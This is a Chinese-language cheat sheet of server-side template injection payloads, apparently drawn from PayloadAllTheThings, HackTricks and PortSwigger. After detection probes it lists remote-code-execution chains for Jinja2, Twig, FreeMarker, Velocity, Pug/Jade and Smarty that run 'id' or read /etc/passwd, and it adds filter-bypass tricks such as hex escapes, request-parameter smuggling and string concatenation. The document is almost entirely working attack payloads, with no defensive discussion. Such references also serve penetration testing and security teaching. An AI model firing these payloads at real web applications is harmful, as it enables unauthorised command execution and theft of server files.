# SSTI 模板注入实战参考

> 分类: 检测 → Jinja2 → Twig → FreeMarker → Velocity → Smarty → Jade → 沙箱绕过

---

## 1. SSTI 检测

### 1.1 通用检测 Payload

```python
# 按模板引擎分组检测:

# === 通用 (数学运算 — 最简单) ===
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# === 多形式尝试 ===
{{7*'7'}}        # Jinja2 → 7777777, Twig → 49
{{config}}        # Flask/Jinja2 → 配置对象
{{self}}          # Jinja2 → TemplateReference
${7*7}            # FreeMarker
#{}               # Pug/Jade
```

### 1.2 按引擎精确识别

| Payload | 引擎 | 预期输出 |
|---------|------|---------|
| `{{7*7}}` | Jinja2/Twig | 49 |
| `${7*7}` | FreeMarker | 49 |
| `#{7*7}` | Thymeleaf/Jade | 49 |
| `<%= 7*7 %>` | ERB/EJS | 49 |
| `{{= 7*7}}` | doT | 49 |

---

## 2. Jinja2 (Python / Flask)

### 2.1 信息收集

```python
# === 基础信息 ===
{{config}}                         # Flask 配置对象
{{self._TemplateReference__context}}  # 内部变量
{{''.__class__}}                   # <class 'str'>
{{''.__class__.__mro__}}           # 继承链

# === 全局变量 ===
{{''.__class__.__mro__[1].__subclasses__()}}  # 所有子类

# === 找可利用的子类 ===
{{''.__class__.__mro__[1].__subclasses__()[<index>]}}  # 遍历找 <class 'subprocess.Popen'>
```

### 2.2 RCE (Jinja2 经典链)

```python
# === 方式1: subprocess.Popen (最常用) ===
# Step 1: 找到 Popen 的索引
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'Popen' %}{{ loop.index0 }}{% endif %}
{% endfor %}

# Step 2: RCE
{{''.__class__.__mro__[1].__subclasses__()[<POPEN_INDEX>]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# === 方式2: os.popen (更短) ===
{{''.__class__.__mro__[1].__subclasses__()[<os._wrap_close索引>].__init__.__globals__['os'].popen('id').read()}}

# === 方式3: __builtins__ ===
{{''.__class__.__mro__[1].__subclasses__()[<索引>].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}

# === 方式4: lipsum (Flask/Jinja2 内置) ===
{{lipsum.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# === 方式5: cycler (Flask/Jinja2内置) ===
{{cycler.__init__.__globals__.os.popen('id').read()}}

# === 方式6: url_for (Flask内置) ===
{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
```

### 2.3 绕过过滤

```python
# === [] 被过滤 → 用 .__getitem__() / |attr() ===
{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}

# === . 被过滤 → 用 |attr() ===
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}

# === __ 被过滤 → 用 \x5f\x5f 或 request.args ===
{{''.__class__}}                        # 原始
{{''\x5f\x5fclass\x5f\x5f}}            # hex 表示
{{''[request.args.a]}}                  # a=__class__ (参数)

# === 引号被过滤 → request 对象 ===
{{lipsum.__globals__[request.args.os]}}   # ?os=os
{{lipsum.__globals__[request.args.os].popen(request.args.cmd).read()}}  # ?os=os&cmd=id

# === 关键字过滤 (config/os/popen) → 字符串拼接 ===
{{''.__class__.__mro__[1].__subclasses__()[x].__init__.__globals__['o'+'s'].popen('id')}}
{{lipsum.__globals__['so'.replace('s','o')]}}  # → 'os'

# === 数字被过滤 ===
{{(1+1)}}                    # 计数
{{dict(a=1)|length}}          # 1
{{[0]|length}}                # 1
```

---

## 3. Twig (PHP)

### 3.1 信息收集

```php
{{_self}}             # 当前模板信息
{{_charset}}          # 字符集
{{dump(app)}}         # Symfony应用对象

# 遍历全局变量
{% for key, value in _context %}{{key}}:{{value}}
{% endfor %}
```

### 3.2 RCE

```php
# === Twig 1.x (registerUndefinedFunctionCallback) ===
{{_self.env.registerUndefinedFunctionCallback("system")}}
{{_self.env.getFunction("system")("id")}}

# === Twig 2.x / 3.x ===
{{['id']|filter('system')}}                     # filter 可调系统函数
{{['cat /etc/passwd']|filter('system')}}

# === Symfony 环境 ===
{{app.request.server.all|join(',')}}             # 环境变量
{{app.request.headers.all|join(',')}}            # headers

# === 绕过方式 ===
{{['id']|filter('s'~'y'~'s'~'t'~'e'~'m')}}    # 拼接绕过
```

---

## 4. FreeMarker (Java)

### 4.1 检测

```java
${7*7}                # → 49
${"freemarker".toUpperCase()}  # → FREEMARKER
```

### 4.2 RCE

```java
# === FreeMarker 经典RCE ===
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# === ObjectConstructor ===
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id".split(" ")).start()}

# === JythonRuntime ===
${"freemarker.template.utility.JythonRuntime"?new()("__import__('os').popen('id').read()")}
```

---

## 5. Velocity (Java)

```java
# === RCE ===
#set($s="")
#set($stringClass=$s.getClass())
#set($rt=$stringClass.forName("java.lang.Runtime"))
#set($exec=$rt.getRuntime().exec("id"))
$exec.waitFor()
#set($out=$exec.getInputStream())
#foreach($i in [1..$out.available()])$out.read()#end
```

---

## 6. Pug / Jade (Node.js)

```javascript
// === RCE ===
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

// === 更短 ===
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

---

## 7. Smarty (PHP)

```php
// === 已废弃的 {php} 标签 ===
{php}echo shell_exec('id');{/php}

// === Smarty 3+ self 变量 ===
{self::getStreamVariable("file:///etc/passwd")}

// === Smarty 3.1.31+ (沙箱绕过) ===
{system('cat /etc/passwd')}
```

---

*参考: PayloadAllTheThings SSTI + HackTricks SSTI + PortSwigger SSTI*
